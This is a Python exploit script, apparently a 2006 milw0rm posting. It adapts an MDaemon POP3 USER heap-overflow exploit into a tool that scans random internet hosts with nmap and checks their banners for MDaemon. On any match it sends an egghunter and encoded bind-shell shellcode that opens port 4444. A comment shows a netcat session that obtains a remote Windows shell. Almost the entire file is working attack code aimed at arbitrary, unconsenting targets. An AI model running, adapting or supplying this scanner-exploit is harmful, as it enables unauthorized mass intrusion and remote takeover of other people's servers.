#!/usr/bin/python
#Modified muts Mdaemon exploit to scan for random open 110 ports then 
#check the banner for Mdaemon, if found, exploits it!!
#d3hydr8[at]gmail[dot]com
import sys, struct, socket, StringIO, re, commands
from time import sleep
########################################################################################
# MDaemon Pre Authentication (USER) Heap Overflow 
# Code based on Leon Juranic's exploit
# Coded by muts - mati@see-security.com
# http://www.hackingdefined.com
# http://www.remote-exploit.org
# Tested on:
# 	Mdaemon 9.0.5
# 	Mdaemon 7.2.3
# 	Mdaemon 7.2.2
# 	Mdaemon 7.2.1
# 	Mdaemon 7.2.0
#		Possibly Others
#		PLEASE CONTINUE READING !
# Huge greets to xbxice and talz for leading me away from the darkness
########################################################################################
# Mdaemon is wierd. It seems like their developers decided to annoy everyone
# by making their software do unexpected things.
# The exploit overwrites UnhandledExceptionFilter, and jumps to an egghunter
# shellcode - which then scans the memory, and executes a bindshell on port 4444.
# 
# On some Win2k SP4 machines, I found SetUnhandledExceptionFilter at 0x00000214,
# for which I unfortunately had no explenation. 
# I later found out that these machines were fully patched ...
# After inspecting kernel32.dll from my SP4 (not fully patched) and comparing it to 
# todays' version, I noticed that the SetunhandledExceptionFilter function had changed, 
# and looks suspiciously similar to XP SP2... 
# Note that my unpatched win2k was last patched 2-3 weeks ago, 
# so I suspect this change is recent.
# The end of easy UnhandledExceptionFilter exploitation on Win2k ?
#
# So, this is a partially working exploit, on unpatched win2k boxes....
# Kiddies, treat this exploit as DOS :)
#
# I got 3 types of results with this code:
#
# 1. Shell :)	
# 2. Mdaemon process shoots up to 100%, scanning memory for shellcode that isn't there.
# 3. Plain ugly crash - oh well.
#
# At minimum, I'de check the UnhandledExceptionFilter address before running the exploit.
######################################################################################## 
# 
# C:\Documents and Settings\muts>nc -v 192.168.220.128 4444
# 97DACBEC7CA4483 [192.168.220.128] 4444 (?) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
# 
# C:\MDaemon\APP>
########################################################################################
def exploit():  			

	ret = struct.pack("<L",0x7c2f62b6)	# 7c2f62b6 advapi.dll JMP ESI+48 SP4 No Patches
	ueh = struct.pack("<L",0x7C54144C)	# SetUnhandledExceptionFilter 0x7C54144C win2k SP4 No Patches
	tap = struct.pack("<L",0xeb169090)  	# Short Jump over some garbage

	# skape's egghunter shellcode 

	egghunter  ="\xeb\x21\x59\xb8\x74\x30\x30\x77\x51\x6a\xff\x33\xdb\x64\x89\x23"
	egghunter +="\x6a\x02\x59\x8b\xfb\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f"
	egghunter +="\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8"
	egghunter +="\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3"

	# win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum

	shellcode  ="\x90\x90\x74\x30\x30\x77\x74\x30\x30\x77" # t00wt00w (!)
	shellcode +="\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
	shellcode +="\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
	shellcode +="\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
	shellcode +="\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
	shellcode +="\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
	shellcode +="\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x38"
	shellcode +="\x4e\x46\x46\x52\x46\x42\x4b\x48\x45\x34\x4e\x53\x4b\x48\x4e\x57"
	shellcode +="\x45\x50\x4a\x47\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x41\x4b\x48"
	shellcode +="\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x48"
	shellcode +="\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x38\x42\x4c"
	shellcode +="\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
	shellcode +="\x46\x4f\x4b\x53\x46\x45\x46\x32\x4a\x52\x45\x37\x45\x4e\x4b\x38"
	shellcode +="\x4f\x35\x46\x52\x41\x30\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x54"
	shellcode +="\x4b\x58\x4f\x45\x4e\x31\x41\x50\x4b\x4e\x43\x50\x4e\x42\x4b\x38"
	shellcode +="\x49\x58\x4e\x46\x46\x52\x4e\x31\x41\x46\x43\x4c\x41\x53\x4b\x4d"
	shellcode +="\x46\x56\x4b\x58\x43\x44\x42\x33\x4b\x48\x42\x54\x4e\x30\x4b\x38"
	shellcode +="\x42\x57\x4e\x51\x4d\x4a\x4b\x58\x42\x54\x4a\x50\x50\x45\x4a\x46"
	shellcode +="\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x35\x4f\x4f\x48\x4d\x48\x56"
	shellcode +="\x43\x35\x48\x46\x4a\x56\x43\x43\x44\x43\x4a\x36\x47\x47\x43\x57"
	shellcode +="\x44\x33\x4f\x45\x46\x45\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
	shellcode +="\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x55\x49\x38\x45\x4e"
	shellcode +="\x48\x36\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x55\x4c\x36\x44\x50"
	shellcode +="\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55"
	shellcode +="\x4f\x4f\x48\x4d\x43\x45\x43\x55\x43\x45\x43\x35\x43\x55\x43\x34"
	shellcode +="\x43\x45\x43\x44\x43\x45\x4f\x4f\x42\x4d\x48\x36\x4a\x56\x41\x51"
	shellcode +="\x4e\x35\x48\x46\x43\x35\x49\x38\x41\x4e\x45\x39\x4a\x46\x46\x4a"
	shellcode +="\x4c\x51\x42\x37\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x36\x42\x51"
	shellcode +="\x41\x35\x45\x55\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x42"
	shellcode +="\x49\x4e\x47\x35\x4f\x4f\x48\x4d\x43\x35\x45\x55\x4f\x4f\x42\x4d"
	shellcode +="\x4a\x46\x45\x4e\x49\x44\x48\x48\x49\x34\x47\x55\x4f\x4f\x48\x4d"
	shellcode +="\x42\x35\x46\x35\x46\x35\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x56"
	shellcode +="\x47\x4e\x49\x57\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x45"
	shellcode +="\x4f\x4f\x42\x4d\x48\x56\x4c\x56\x46\x56\x48\x56\x4a\x46\x43\x46"
	shellcode +="\x4d\x46\x49\x38\x45\x4e\x4c\x46\x42\x55\x49\x55\x49\x32\x4e\x4c"
	shellcode +="\x49\x38\x47\x4e\x4c\x36\x46\x34\x49\x58\x44\x4e\x41\x33\x42\x4c"
	shellcode +="\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x52\x50\x4f\x44\x34\x4e\x42"
	shellcode +="\x43\x59\x4d\x58\x4c\x57\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
	shellcode +="\x44\x37\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x47\x46\x44\x4f\x4f"
	shellcode +="\x48\x4d\x4b\x35\x47\x45\x44\x55\x41\x55\x41\x55\x41\x55\x4c\x56"
	shellcode +="\x41\x50\x41\x45\x41\x35\x45\x45\x41\x55\x4f\x4f\x42\x4d\x4a\x56"
	shellcode +="\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x46"
	shellcode +="\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x58\x47\x55\x4e\x4f"
	shellcode +="\x43\x38\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x35\x4f\x4f\x42\x4d"
	shellcode +="\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x35\x43\x55\x4f\x4f\x48\x4d"
	shellcode +="\x4f\x4f\x42\x4d\x5a"

	buffer ="AAA"+tap+"BBBB"+ret+ueh+"\x90"*90 +egghunter+"C"*346

	for x in range(5):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,port))
			data=s.recv(1024)
			print data
			s.send('USER '+'@A' * 1600 + '\x90'*5945 + shellcode +'D'*3711 + '\r\n') 
			s.send('QUIT\r\n')
			s.close()
			sleep(1)
		except socket.error, msg:
			print "An error occurred:", msg
			s.close()
		

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,port))
		data=s.recv(1024)
		print data
		s.send('USER ' + '@A@A'+ buffer + '\r\n')
		data=s.recv(1024)
		print data
		s.send('USER ' + 'A' * 3370 + '\r\n')
		s.close()
	except socket.error, msg:
			print "An error occurred:", msg
			s.close()
			
	try:		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,port))
		data=s.recv(1024)
		print data
		s.send('USER ' + '@A@A'+ buffer + '\r\n')
		data=s.recv(1024)
		print data
		s.send('USER ' + 'A' * 3370 + '\r\n')
		s.close()
		sleep(1)
	except socket.error, msg:
			print "An error occurred:", msg
			s.close()

if len(sys.argv) != 2:
	print "Usage: ./mdaemonscan.py <How many ips would you like to scan?>"
	sys.exit(1)
else:
	num=sys.argv[1]
	
	print "\nScanning",num,"hosts for port 110 open to exploit...\n"
	count = 0
	while count != int(num):
		count += 1
		nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 -p 25,110 -iR 1 | grep -B 4 open')[1]).readlines()
		for tmp in nmap:
			if re.search("110/tcp\s+(?=open)", tmp):
				port = int(110)
			if re.search("25/tcp\s+(?=open)", tmp):
				port = int(25)
		for tmp in nmap:
			ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
			if ipaddr:
				host = ipaddr[0]
				print "\nFound port open on",host,"checking banner."
	
				try:
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(10)
					s.connect((host, port))
					sleep(4)
					s.send("\r\n")
					response = s.recvfrom(1024)[0]
					s.close()		
					if re.search("mdaemon", response.lower()): 
						print "\n\t\tMdaemon found in banner, attempting to exploit...\n"
						exploit()
					else: print "\n\t\tNo Match\n"
				except socket.error, msg:
					print "An error occurred:", msg
					s.close()
# milw0rm.com [2006-08-26]

